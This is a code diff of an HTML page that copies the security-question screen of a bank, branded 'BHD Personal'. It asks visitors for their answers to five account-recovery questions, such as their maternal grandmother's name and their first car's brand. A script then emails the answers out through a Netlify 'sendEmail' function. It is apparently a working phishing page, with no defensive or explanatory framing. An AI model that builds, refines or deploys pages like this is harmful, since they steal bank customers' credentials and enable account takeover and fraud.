@@ -3,179 +3,147 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Preguntas de Seguridad</title>
+    <title>Recreación de Imagen</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #2e2e2e;
-            color: white;
+            background-color: #f4f4f4;
             margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
-
-        .container {
-            text-align: center;
-            width: 90%;
-            max-width: 500px;
-            background-color: #1c1c1c;
             padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            box-sizing: border-box;
         }
-
-        .container h1 {
-            color: #39b54a;
+        .container {
+            max-width: 500px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            text-align: center;
             margin-bottom: 20px;
         }
-
-        label {
-            display: block;
-            margin: 15px 0 5px;
-            text-align: left;
+        h2 {
+            text-align: center;
+            color: #333;
         }
-
+        .security-question {
+            margin-bottom: 15px;
+        }
         input[type="text"] {
             width: 100%;
             padding: 10px;
-            margin-bottom: 10px;
-            border: none;
-            border-radius: 5px;
-            background-color: #333;
-            color: white;
+            border: 1px solid #ccc;
+            border-radius: 4px;
             box-sizing: border-box;
         }
-
-        .help {
-            font-size: 14px;
-            margin-top: 10px;
-            color: #39b54a;
+        input[type="checkbox"] {
+            margin-right: 5px;
         }
-
-        .help a {
-            color: #39b54a;
-            text-decoration: none;
-        }
-
-        .actions {
-            margin-top: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .actions button {
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            width: 100%;
-            cursor: pointer;
-        }
-
-        .cancel {
-            background-color: #444;
-            color: white;
-        }
-
-        .continue {
-            background-color: #39b54a;
-            color: white;
-        }
-
-        .school {
+        .buttons {
             text-align: center;
             margin-top: 20px;
-            font-size: 14px;
         }
-
-        @media (min-width: 768px) {
-            .actions {
-                flex-direction: row;
-                justify-content: space-between;
-            }
-
-            .actions button {
-                width: 48%;
-            }
+        button {
+            padding: 10px 15px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 0 5px;
+        }
+        button:hover {
+            background-color: #45a049;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Preguntas de seguridad</h1>
-        <p>Tu seguridad es muy importante para nosotros. Por favor, responde las preguntas que configuraste para acceder a tus productos.</p>
-        <form id="security-form">
-            <label>¿Cuál es el personaje de su libro favorito?</label>
-            <input type="text" id="favorite-character" placeholder="Digita tu respuesta" required>
-
-            <label>¿Cuál es la marca de su primer carro?</label>
-            <input type="text" id="first-car-brand" placeholder="Digita tu respuesta" required>
-
-            <label>¿Cuál es su color favorito?</label>
-            <input type="text" id="favorite-color" placeholder="Digita tu respuesta" required>
-
-            <label>¿Cuál es el nombre de su abuela materna?</label>
-            <input type="text" id="grandmother-name" placeholder="Digita tu respuesta" required>
-
-            <div class="school">nombre del colegio donde cursó la<br>primaria</div>
-            <input type="text" id="school-name" placeholder="Digita tu respuesta" required>
-            
-            <div class="help">
-                Si olvidaste tus preguntas de seguridad, comunícate con nosotros: <br>
-                <a href="tel:8092435000">809-243-5000</a>
-            </div>
-
-            <div class="actions">
-                <button type="button" class="cancel">Cancelar</button>
-                <button type="submit" class="continue">Continuar</button>
-            </div>
-        </form>
+<div class="container">
+    <div class="logo">
+        <img src="assets/logo-bhd.svg" alt="BHD Logo" width="100">
+        <h2>BHD Personal</h2>
     </div>
 
-    <script>
-        document.getElementById('security-form').addEventListener('submit', function(event) {
-            event.preventDefault();
+    <h2>Validación de acceso</h2>
+    <p>Responde correctamente las preguntas de seguridad que configuraste para acceder a tus productos.</p>
 
-            const favoriteCharacter = document.getElementById('favorite-character').value;
-            const firstCarBrand = document.getElementById('first-car-brand').value;
-            const favoriteColor = document.getElementById('favorite-color').value;
-            const grandmotherName = document.getElementById('grandmother-name').value;
-            const schoolName = document.getElementById('school-name').value;
+    <form id="security-form">
+        <div class="security-question">
+            <label>¿Cuál es el personaje de su libro favorito?</label>
+            <input type="text" id="favorite-character" placeholder="Ingresa tu respuesta" required>
+        </div>
 
-            const formData = {
-                favoriteCharacter,
-                firstCarBrand,
-                favoriteColor,
-                grandmotherName,
-                schoolName
-            };
+        <div class="security-question">
+            <label>¿Cuál es la marca de su primer carro?</label>
+            <input type="text" id="first-car-brand" placeholder="Ingresa tu respuesta" required>
+        </div>
 
-            fetch('/.netlify/functions/sendEmail', {
-                method: 'POST',
-                body: JSON.stringify(formData),
-                headers: {
-                    'Content-Type': 'application/json'
-                }
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.message === 'Correo enviado con éxito') {
-                    alert('Las respuestas fueron enviadas correctamente.');
-                } else {
-                    alert('Hubo un error al enviar las respuestas.');
-                }
-            })
-            .catch(error => {
-                console.error('Error al enviar las respuestas:', error);
+        <div class="security-question">
+            <label>¿Cuál es su color favorito?</label>
+            <input type="text" id="favorite-color" placeholder="Ingresa tu respuesta" required>
+        </div>
+
+        <div class="security-question">
+            <label>¿Cuál es el nombre de su abuela materna?</label>
+            <input type="text" id="grandmother-name" placeholder="Ingresa tu respuesta" required>
+        </div>
+
+        <div class="security-question">
+            <label>¿Nombre del colegio donde cursó la primaria?</label>
+            <input type="text" id="school-name" placeholder="Ingresa tu respuesta" required>
+        </div>
+
+        <div class="security-question">
+            <input type="checkbox" required>
+            Acepto los términos y condiciones
+        </div>
+
+        <div class="buttons">
+            <button type="submit">Enviar</button>
+            <button type="button" onclick="window.location.reload()">Cancelar</button>
+        </div>
+    </form>
+</div>
+
+<script>
+    document.getElementById('security-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const favoriteCharacter = document.getElementById('favorite-character').value;
+        const firstCarBrand = document.getElementById('first-car-brand').value;
+        const favoriteColor = document.getElementById('favorite-color').value;
+        const grandmotherName = document.getElementById('grandmother-name').value;
+        const schoolName = document.getElementById('school-name').value;
+
+        const formData = {
+            favoriteCharacter,
+            firstCarBrand,
+            favoriteColor,
+            grandmotherName,
+            schoolName
+        };
+
+        fetch('/.netlify/functions/sendEmail', {
+            method: 'POST',
+            body: JSON.stringify(formData),
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message === 'Correo enviado con éxito') {
+                alert('Las respuestas fueron enviadas correctamente.');
+            } else {
                 alert('Hubo un error al enviar las respuestas.');
-            });
+            }
+        })
+        .catch(error => {
+            console.error('Error al enviar las respuestas:', error);
+            alert('Hubo un error al enviar las respuestas.');
         });
-    </script>
+    });
+</script>
 </body>
 </html>
